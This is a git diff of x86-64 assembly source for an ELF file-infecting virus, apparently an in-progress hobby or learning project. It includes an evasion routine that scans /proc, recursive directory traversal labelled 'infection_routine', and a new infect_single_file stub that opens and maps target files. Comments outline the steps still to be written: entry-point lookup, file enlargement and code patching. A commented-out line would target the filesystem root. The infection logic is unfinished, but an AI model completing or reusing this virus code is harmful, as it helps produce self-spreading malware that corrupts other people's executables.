@@ -46,6 +46,10 @@ mother:
     lea rdi, [rel root_dirs]
     call infection_routine
     jmp exit_err
+
+    ; lea r8, [rel _end] ; end addr
+    ; lea r9, [rel _start]; start addr
+    ; sub r8, r9 ; r8 = end - start
     
 
 ; evasion routine, this is run to detect if certain
@@ -56,6 +60,7 @@ evasion_routine:
     push rcx
     push r8
     push r9
+    push r10
 
     mov rax, SYS_OPEN
     lea rdi, [rel proc_dir]
@@ -121,6 +126,9 @@ evasion_routine:
     push rcx
     syscall
     pop rcx
+    
+    ; save fd to r10 for close later
+    mov r10, rax
 
     ; jmp to dirent_read_loop_start_evasion_end if err
     test rax, rax
@@ -137,6 +145,13 @@ evasion_routine:
     syscall
     pop rcx
     mov byte [rsp + rax], 0
+
+	; close the original fd
+    mov rdi, r10
+    mov rax, SYS_CLOSE
+    push rcx
+    syscall
+    pop rcx
 
     ; strstr
 	lea rdi, [rsp]
@@ -169,24 +184,21 @@ evasion_routine:
 
 
 .file_loop_end_evasion:
+    push rax
+    mov rdi, r9
+    mov rax, SYS_CLOSE
+    syscall
+    pop rax
     add rsp, DIRENT_BUF_SZ
 
 mov rax, 1
 .ret:
+    pop r10
     pop r9
     pop r8
     pop rcx
     pop rbx
     ret
-
-    ; lea r8, [rel _end] ; end addr
-    ; lea r9, [rel _start]; start addr
-    ; sub r8, r9 ; r8 = end - start
-
-
-    ; xor rdi, rdi                        ; exit code 0
-    ; mov rax, SYS_EXIT                   ; exit
-    ; syscall
 
 ; input, rdi - a list of root directories
 infection_routine:
@@ -263,7 +275,7 @@ infection_routine:
     mov rdi, rax
     call strcpy
 
-	; TODO: /bin/ doesnt work when system root
+	; NOTE: /bin is symlink to /usr/bin
     ; check if dirent.d_name is bad (./ and ../)
     lea rdi, [rbx + rcx + dirent.d_name]
     lea rsi, [rel excl_dir]
@@ -281,14 +293,15 @@ infection_routine:
 
 
 .skip_recurse:
-    ; lea rdi, [rbx + rcx]
-    ; mov rdi, [rdi + rax - 1]
-
 
 
     ; print stuff
     lea rdi, [rsp]
     call write_string_nl
+    push rcx
+    call infect_single_file
+    pop rcx
+
 
 .dirent_read_loop_start_infection_end:
     add rsp, BLAZEIT
@@ -304,6 +317,11 @@ infection_routine:
     jmp .file_loop_start_infection
 
 .file_loop_end_infection:
+	push rax
+    mov rdi, r9
+    mov rax, SYS_CLOSE
+    syscall
+    pop rax
     add rsp, DIRENT_BUF_SZ
 
     
@@ -318,27 +336,83 @@ infection_routine:
 
 .roots_iter_end:
 
-
-    ; ; load first addr
-    ; mov rbx, rdi
-    ; mov rdi, rbx
-    ; call write_string_nl
-
-    ; ; load 2nd addr
-    ; call strlen
-    ; inc rax
-    ; add rdi, rax
-    ; call write_string_nl
     
 
-    ; if entity is a file, infect file
-
-    ; if entity is a folder, call infection_routine on that folder
 .ret:
     pop r8
 	pop r9
     pop rcx
     pop rbx
+    ret
+
+infect_single_file:
+    push r8
+    push r9
+    push r10
+
+    mov rax, SYS_OPEN
+    mov rsi, O_RDONLY
+    syscall ; read
+
+    test rax, rax
+    js .ret
+
+    ; fd to r8
+    mov r8, rax
+
+    ; get file size via lseek
+    mov rdi, rax
+    mov rsi, 0
+    mov rdx, SEEK_END
+    mov rax, SYS_LSEEK
+    syscall
+
+    test rax, rax
+    js .ret
+
+	; addr = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0); // NOTE: need to free this using munmap
+    ; (rdi, rsi, rdx, rcx, r8, r9)
+    ; mmap file contents to buffer
+    mov rdi, 0
+    mov rdi, rax
+    mov rdx, PROT_READ
+    mov rcx, MAP_PRIVATE
+    mov r8, r8 ; fd is already in r8
+    mov r9, 0
+    mov rax SYS_MMAP
+    syscall
+
+    
+    ; from file contents, check if its elf64.
+    ; if its not elf64, close and munmap and return
+
+    
+    ; get the entry point (vaddr)
+
+    ; iterate the program header, see which segment is the entry point (usually is load segment with RX)
+    ; calculate entry point offset (entry vaddr - pheader.vaddr)
+
+    ; go to entry point offset in buffer, check if infected (TODO: calculate offset later)
+    ; if infected, close and munmap and return
+
+    ; if not infected, close and munmap
+
+    ; ftruncate to add 0x1000 (4096) bytes (hardcoded offset here)
+    ; mmap the file with new size here
+
+    ; do the actual patching (TBD)
+
+    ; check next program header (segment) comes next, and calulate space avail ((pheader_nxt.offset) - (pheader_curr.offset + size))
+    ; if smaller than _end - _start, (WAIT NO)
+
+    ; jmp exit_ok
+
+
+
+.ret:
+	pop r10
+    pop r9
+    pop r8
     ret
 
 
@@ -513,8 +587,9 @@ root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
 ; root_dirs db `/`,0,0
 
 excl_dir db `.`, 0, `..`, 0, 0
-; excl_dir db `.`, 0, `..`, 0, `etc`, 0, `proc`, 0, `sys`, 0, 0
-; excl_dir db `.`, 0, `..`, 0, `home`, 0, `proc`, 0, `sys`, 0, `usr`, 0, 0
+; excl_dir db `.`, 0, `..`, 0, `etc`, 0, `proc`, 0, `sys`, 0, `dev`, 0, `lost+found`, 0, `media`, 0, `mnt`, 0, `opt`, 0, `proc`, 0, `boot`, 0, `run`, 0, `var`, 0, 0
+
+
 
 
 
